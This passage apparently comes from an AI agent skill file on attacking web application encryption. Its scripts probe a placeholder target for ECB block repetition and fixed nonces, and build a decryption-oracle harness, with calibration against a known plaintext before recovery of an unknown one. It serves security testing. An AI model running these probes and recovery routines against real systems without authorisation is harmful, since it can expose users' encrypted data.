    print(f"len {n:3} blocks={len(blocks)} duplicate_blocks={len(dupes)}")
PY
```

**Repeated ciphertext blocks for repeated plaintext blocks is ECB**, and it is a finding only when
combined with an observable effect: a reordered block that changes a stored value, confirmed by a
read-back.

### 15.5 Recover a known plaintext first, then one you do not know

```bash
# ground truth: you know exactly what you encrypted
curl -sS -o /tmp/gt "$T/api/encrypt?plain=KNOWNSECRETVALUE" -H "Cookie: $S"
CT=$(python3 -c "import json;print(json.load(open('/tmp/gt'))['token'])")
echo "ciphertext: $CT"
# run the recovery against it, and compare to the known value byte for byte
echo "KNOWN:      KNOWNSECRETVALUE"
echo "RECOVERED:  <your recovery output> - these must match exactly"
# only then point the same routine at a ciphertext the application produced for a real user message
```

**Recovery against a known value is the calibration; recovery against an unknown one is the finding.**
Report both, in that order, so the reader can see the primitive is real.

### 15.6 Stream ciphers: nonce reuse

```bash
# two ciphertexts under the same keystream XOR to the XOR of the plaintexts
python3 - <<'PY'
import urllib.request, json
T="https://target.tld"; S="session=PASTE"
def enc(p):
    r=urllib.request.Request(f"{T}/api/encrypt?plain={p}",headers={"Cookie":S})
    return json.loads(urllib.request.urlopen(r).read())["token"]
c1=enc("A"*32); c2=enc("A"*32)
print("same plaintext encrypts to the same ciphertext:", c1==c2, "(deterministic - nonce reuse or ECB)")
# XOR the two into bytes and look for the structured plaintext pattern
PY
# the confirmation: encrypt a known value twice, XOR the ciphertexts, and check they cancel
echo "identical ciphertexts for identical plaintext mean the nonce is fixed - the keystream is reusable"
```

**A randomised cipher is the control here.** Encrypt the same plaintext twice and show that a properly
nonced implementation differs while the target does not. That pair is the evidence.

### 15.7 A harness that reports calibration and recovery separately

```bash
python3 - <<'PY'
import urllib.request, json, time, random, string
T="https://target.tld"; S="session=PASTE"
def oracle(tok):
    r=urllib.request.Request(f"{T}/api/decrypt?token={tok}",headers={"Cookie":S})
    try:
        x=urllib.request.urlopen(r,timeout=10); return x.status,len(x.read())
    except urllib.error.HTTPError as e: return e.code,len(e.read())
    except Exception: return None,0

cal_ok = oracle("VALID_CT") == oracle("VALID_CT")          # stable
print("oracle stable on valid input:", cal_ok)
noise = sum(1 for _ in range(30) if oracle("".join(random.choice(string.ascii_letters) for _ in range(24))) == oracle("VALID_CT"))
print(f"noise floor: {noise}/30 random inputs look 'valid'")
print()
print("Only proceed if the noise floor is low AND the oracle is stable.")
print("Then: recover the KNOWN plaintext, print it beside the known value, and only then")
print("run the same routine against an unknown ciphertext.")
print("Report: calibration result, the known-plaintext recovery, and the unknown recovery.")
PY
```

**Three outputs, in this order: calibration, known recovery, unknown recovery.** An attack report that
starts at the third output has no demonstrated primitive underneath it.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER
- [hash-attack-techniques](../hash-attack-techniques/SKILL.md) - the sibling class for the fingerprint-based constructions
- [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) - the public-key counterpart with the same calibration discipline
- [classical-cipher-analysis](../classical-cipher-analysis/SKILL.md) - the frequency and structure analysis this builds on
- [lattice-crypto-attacks](../lattice-crypto-attacks/SKILL.md) - the mathematical method behind the weak-parameter cases
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - where a broken cipher becomes an authentication bypass
